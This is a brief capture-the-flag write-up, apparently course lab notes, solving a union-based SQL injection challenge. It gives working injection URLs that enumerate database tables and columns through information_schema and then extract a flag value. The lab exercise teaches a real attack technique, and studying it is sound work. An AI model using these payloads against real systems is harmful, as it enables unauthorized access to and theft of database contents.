union based SQLi

use this table to get needed information

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

# get tables
http://tor.atdog.tw:8080/union/news.php?id=1%20)%20union%20(%20SELECT%20table_schema,table_name%20FROM%20information_schema.tables

# get columns
http://tor.atdog.tw:8080/union/news.php?id=1%20)%20union%20(%20SELECT%20table_name,%20column_name%20FROM%20information_schema.columns

# get flags
news.php?id=1 ) union ( select 1, flag from wtf_flags
http://tor.atdog.tw:8080/union/news.php?id=1%20)%20union%20(%20select%201,flag%20from%20wtf_flags

Title: This is title
Title: SecProg{UnionSqlInjection_is_very_simle}
